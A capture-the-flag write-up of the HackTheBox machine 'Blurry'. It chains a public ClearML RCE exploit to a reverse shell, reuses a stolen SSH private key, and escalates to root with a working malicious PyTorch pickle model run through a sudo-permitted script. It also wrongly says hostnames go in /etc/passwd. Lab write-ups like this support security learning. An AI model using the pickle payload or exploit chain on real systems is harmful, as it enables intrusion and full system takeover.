---
title: Blurry - HackTheBox Machine WriteUp
date: 2024-10-24 00:00:00 +8000
categories:
  - Writeup
  - HackTheBox
tags:
  - writeup
  - hackthebox
  - htb
  - machine
  - linux
  - medium
  - artificial-intelligence
  - python
image:
  path: /assets/img/post/hackthebox/blurry/thumbnail.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: HackTheBox Machine Blurry
---
This is my WriteUp for the medium difficulty Linux machine [Blurry](https://app.hackthebox.com/machines/Blurry) on [HackTheBox Labs](https://app.hackthebox.com/).

---
## Recon
My first step was to scan with `nmap` the machine for open ports:
```shell
$ nmap -p- -vvv $LAB_IP -Pn
```
Copy the scan result in a file(e.g. `nmap/ports`) and use the following command to get all ports comma separated as output:
```shell
$ cat nmap/ports | cut -f1 -d '/' | tr '\n' ','
```
Then I performed a more detailed version scan on these ports:
```shell
$ nmap -p22,80 -sC -sV -oA nmap/resourced $LAB_IP -Pn
```

There were only two open ports available:
- Port `22` - `ssh`
- Port `80` - `http` (`nginx` web server on version `1.18.0`)

After running `whatweb` we have to add `app.blurry.htb` to `/etc/passwd`.

On port `80` there is a service running called [`ClearML`](https://clear.ml/). 

After a few seconds of researching I found on [Github an PoC Exploit](https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit). I cloned it to my hacking lab and installed the python requirements:
```shell
$ git clone https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit

$ cd CVE-2024-24590-ClearML-RCE-Exploit

$ pip install -r requirements.txt
```

Then we could execute the exploit: 
```shell
$ python3 exploit.py
```
First I had to select `1` to initialize ClearML and go to `http://app.blurry.htb/settings/workspace-configuration` to create new credentials:
![](assets/img/post/hackthebox/blurry/clearml_credentials.png)
Therefore we have to add `api.blurry.htb` and `files.blurry.htb` to the `/etc/passwd` file.

I created on the `app.blurry.htb` dashboard a new project called `HackMe`.

Then I pasted the credentials to the console and the setup was completed. I could return to the menu by entering `menu`.

After the configuration, I had to select `2`, then enter our local IP address and port for the reverse shell and enter the previously configured project name `HackMe`.

After that I had to wait a few seconds and we have a reverse shell and could access the user flag.

To get a permanent foothold, I copied the `.ssh/id_rsa` key and could login with `ssh`:
```shell
$ chmod 600 blurry_ssh_key

$ ssh -i blurry_ssh_key jippity@blurry.htb
```

---
## Privilege Escalation
After I got the foothold on the system, I tried to escalate the privileges.

First of all I listed all allowed commands that the user `jippity` can run with `sudo`:
```shell
$ sudo -l

User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
``` 
It seems like, it can run the script `/usr/bin/evaluate_model` bash script without a password with `sudo` and the script will evaluate a `.pth` file. `.pth` files are saved `pytorch` models and if the model is loaded, `pytorch` uses `pickle` to deserialize the the pickled object.

I could exploit this, by creating a malicious `pytorch` model, which will be deserialized, to execute commands. 
I research for a short time and found a [Github Repository with a Evil Pytorch Model PoC](https://github.com/duck-sec/pytorch-evil-pth). This Proof of Concept overrides the `__reduce__` method to specify custom serialization behavior. My simplified pytorch model executes a `/bin/bash` shell. And because we will execute the evaluation of the model with `root` permissions, the shell we are creating should have `root` privileges:
```python
import torch
import os

class EvilModel(torch.nn.Module):
    def __init__(self):
        super(EvilModel, self).__init__()

    def __reduce__(self):  
        return os.system, ("/bin/bash",)

torch.save(EvilModel(), 'evil_model.pth')
```

I copied the code to the machine and executed the code:
```shell
$ python3 evil.py
```

After that,  a `evil_model.pth` file was created and I tried to load it with the `evaluate_model` script:
```shell
$ sudo /usr/bin/evaluate_model /models/evil_model.pth
```

And it worked! I got a root shell and could read the root flag from the root home directory!

---
## Exploit Chain
**Recon:**
1. Port scan with `nmap`
2. Research **ClearML** for vulnerabilities
3. Exploit the Platform and trigger a RCE to get a reverse shell

**Privilege Escalation:**
4. List users sudo capabilities with `sudo -l`
5. Read through the bash script
6. Research how `pytorch` model saving and loading works
7. Create a malicious `pytorch` model and save it to a `.pth` file
8. Load the malicious model with the bash script using `sudo` to get a root shell

---
## Resources
- [ClearML](https://clear.ml)
- [ClearML PoC Exploit](https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit)
- [Evil Pytorch PoC](https://github.com/duck-sec/pytorch-evil-pth)
